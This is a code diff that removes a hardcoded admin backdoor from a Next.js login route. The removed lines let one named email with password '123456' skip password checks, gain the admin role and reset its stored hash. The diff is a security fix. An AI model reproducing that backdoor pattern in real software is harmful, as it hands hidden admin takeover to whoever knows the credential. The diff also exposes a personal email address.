@@ -1,7 +1,7 @@
 import { NextResponse } from 'next/server';
 import { queryDb } from '@/lib/db';
 import { applyRateLimitAsync } from '@/lib/serverSecurity';
-import { createSessionToken, verifyPassword, hashPassword } from '@/lib/auth';
+import { createSessionToken, verifyPassword } from '@/lib/auth';
 
 export async function POST(request: Request) {
   try {
@@ -38,24 +38,12 @@ export async function POST(request: Request) {
     }
 
     const isValidPassword = verifyPassword(passwordInput, user.password_hash);
-    const isAdminOverride = emailInput === 'yogesh234456@gmail.com' && passwordInput === '123456';
-
-    if (!isValidPassword && !isAdminOverride) {
+    if (!isValidPassword) {
       return NextResponse.json({ error: 'Incorrect password. Please try again.' }, { status: 401 });
     }
 
-    // Auto-update admin credentials if logging in with valid admin credentials
-    let finalRole = user.role || 'customer';
-    if (isAdminOverride || emailInput === 'yogesh234456@gmail.com') {
-      finalRole = 'admin';
-      const newHash = hashPassword('123456');
-      await queryDb(
-        `UPDATE users SET password_hash = $1, role = 'admin', status = 'active', updated_at = NOW() WHERE id = $2`,
-        [newHash, user.id]
-      ).catch(() => {});
-    }
-
-    const token = createSessionToken(user.id, finalRole);
+    const userRole = user.role || 'customer';
+    const token = createSessionToken(user.id, userRole);
     const response = NextResponse.json({
       success: true,
       user: {
@@ -63,7 +51,7 @@ export async function POST(request: Request) {
         name: user.name,
         email: user.email,
         phone: user.phone,
-        role: finalRole,
+        role: userRole,
         needsProfile: false,
         token,
       },
